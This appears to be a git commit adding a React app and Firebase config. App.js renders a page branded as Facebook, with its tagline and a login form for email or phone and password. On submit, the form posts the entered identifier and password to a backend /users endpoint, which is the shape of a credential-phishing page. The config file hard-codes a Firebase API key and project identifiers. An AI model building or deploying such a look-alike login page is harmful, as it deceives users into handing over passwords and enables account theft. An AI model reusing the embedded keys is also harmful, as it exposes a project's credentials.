1c5750f64088db7b8a9b7ef039a5f1d0ae348754
mdriyadmr968 <mdriyadmr968@gmail.com>
2022-01-28 22:28:36 +0600

    first commit

---
+++ src/App.js
@@ -0,0 +1,90 @@
+import React, { useRef } from "react";
+import "./App.css";
+import intializeAuthentication from "./firebase/firebase.init";
+intializeAuthentication()
+
+function App() {
+  const nameRef = useRef();
+  const emailRef = useRef();
+
+  const handleAddUser = (e) => {
+    const name = nameRef.current.value;
+    const email = emailRef.current.value;
+
+    const newUser = { name, email };
+
+    fetch("http://localhost:5000/users", {
+      method: "POST",
+      headers: {
+        "content-type": "application/json",
+      },
+      body: JSON.stringify(newUser),
+    })
+      .then((res) => res.json())
+      .then((data) => {
+        if (data.insertedId) {
+          // alert("Successfully added the user.");
+          e.target.reset();
+        }
+      });
+    e.preventDefault();
+  };
+
+  return (
+    <>
+      <div className="h1">
+        <h1 className="h">facebook</h1>
+        <p className="pr">
+          Facebook helps you connect and share with the people in your life.
+        </p>
+      </div>
+      <form className="main" onSubmit={handleAddUser}>
+        <input
+          type="text"
+          placeholder="Email address or phone number"
+          class="txt"
+          ref={nameRef}
+        />
+        <br />
+        <input
+          type="password"
+          placeholder="Password"
+          class="txt"
+          ref={emailRef}
+        />
+        <br />
+        <input type="submit" value="Log In" class="login-btn" />
+        <br></br>
+
+        <div className="a-link">
+          <a href="/" className="link">
+            Forgotten Password?
+          </a>
+        </div>
+        <div className="ca">
+          <a href="/" class="pca">
+            Create New Account
+          </a>
+        </div>
+      </form>
+    </>
+  );
+}
+
+
+
+
+
+//   return (
+//     <div>
+//       <h2>Please Add an User</h2>
+//       <form onSubmit={handleAddUser}>
+//         <input type="text" ref={nameRef} />
+//         <input type="text" name="" id="" ref={emailRef} />
+//         <input type="submit" value="Add" />
+//       </form>
+//     </div>
+//   );
+// }
+
+export default App;
---
+++ src/firebase/firebase.config.js
@@ -0,0 +1,10 @@
+const firebaseConfig = {
+  apiKey: "AIzaSyCpLWnk1GbYxNEN_ZNkJaG92kImyuDYrhg",
+  authDomain: "facebook-1e8cc.firebaseapp.com",
+  projectId: "facebook-1e8cc",
+  storageBucket: "facebook-1e8cc.appspot.com",
+  messagingSenderId: "898457510357",
+  appId: "1:898457510357:web:187d3bb71c3b0358415d5c",
+};
+
+export default firebaseConfig;
